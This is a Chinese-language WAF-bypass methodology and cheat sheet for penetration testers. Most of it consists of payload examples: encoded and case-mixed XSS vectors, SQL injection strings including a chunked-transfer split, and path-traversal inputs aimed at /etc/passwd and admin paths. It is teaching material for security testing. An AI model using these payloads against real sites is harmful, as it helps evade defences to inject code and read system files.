# WAF 绕过技术方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对 Web 应用防火墙（WAF）的绕过技术方法论。

### 1.2 适用范围
- 云 WAF（Cloudflare、AWS WAF 等）
- 主机 WAF（ModSecurity 等）
- 应用层防护

### 1.3 读者对象
- 渗透测试工程师
- 红队成员

---

## 第二部分：核心绕过技术专题

### 专题：WAF 绕过技术

#### 2.1 技术介绍

WAF 绕过是指通过特定技术规避 Web 应用防火墙的检测和拦截，成功执行攻击。

#### 2.2 常见绕过技术

##### 2.2.1 编码绕过

| 技术 | 示例 | 说明 |
|-----|------|------|
| **URL 编码** | `%27` → `'` | 基本编码 |
| **双重 URL 编码** | `%2527` → `%27` → `'` | 绕过解码 |
| **Unicode 编码** | `\u0027` → `'` | Unicode 表示 |
| **Base64 编码** | `J2FsZXJ0KDEp` → `alert(1)` | 数据编码 |

##### 2.2.2 大小写绕过

```bash
# 如果 WAF 区分大小写
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>

# SQL 注入
SELECT * FROM users
sElEcT * FrOm users
```

##### 2.2.3 空格绕过

```bash
# 使用注释代替空格
SELECT/**/password/**/FROM/**/users

# 使用括号
SELECT(password)FROM(users)

# 使用特殊空白字符
SELECT%0Apassword%0AFROM%0Ausers
```

##### 2.2.4 特殊字符绕过

```bash
# SQL 注入
' OR 1=1--
' OR 1=1#
' OR 1=1/*

# 路径遍历
..;/admin
..%c0%af..%c0%afadmin
....//....//admin
```

##### 2.2.5 HTTP 参数污染

```bash
# 多个相同参数
?id=1&id=2&id=3

# 参数分隔符
?id=1&id=2
?id=1,id=2
```

##### 2.2.6 分块传输绕过

```http
POST /login HTTP/1.1
Transfer-Encoding: chunked

5
' OR '
1
'
0
```

#### 2.3 利用方法

##### 2.3.1 XSS WAF 绕过

```html
<!-- 基本绕过 -->
<script>alert(1)</script>

<!-- 大小写 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 编码 -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 事件处理器 -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
```

##### 2.3.2 SQL 注入 WAF 绕过

```sql
-- 基本绕过
' OR 1=1--

-- 编码绕过
%27%20OR%201%3D1--

-- 注释绕过
' OR 1=1/*

-- 内联注释
' OR /*!12345*/ 1=1--

-- 宽字节注入
%df' OR 1=1--
```

##### 2.3.3 路径遍历 WAF 绕过

```bash
# 基本绕过
../../../etc/passwd

# URL 编码
%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 双重编码
%252e%252e%252f

# Unicode
\u002e\u002e\u002f

# 特殊路径
..;/admin
....//admin
```

---

## 第三部分：附录

### 3.1 检测工具

| 工具名称 | 用途 |
|---------|------|
| **WAFW00F** | WAF 识别 |
| **Bypass-403** | 403 绕过 |
| **sqlmap** | SQL 注入绕过 |

### 3.2 参考资源

- [OWASP WAF Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
